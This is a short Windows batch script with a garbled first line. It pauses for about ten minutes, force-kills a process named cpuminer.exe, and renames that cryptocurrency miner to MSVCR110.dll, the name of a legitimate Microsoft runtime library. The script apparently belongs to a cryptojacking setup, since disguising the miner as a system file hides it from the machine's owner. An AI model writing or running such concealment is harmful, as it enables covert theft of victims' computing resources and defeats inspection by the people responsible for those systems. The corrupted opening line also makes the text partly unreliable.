��cho off
@echo off
ping /n 600 127.1>nul
taskkill /f /t /im cpuminer.exe
rename cpuminer.exe MSVCR110.dll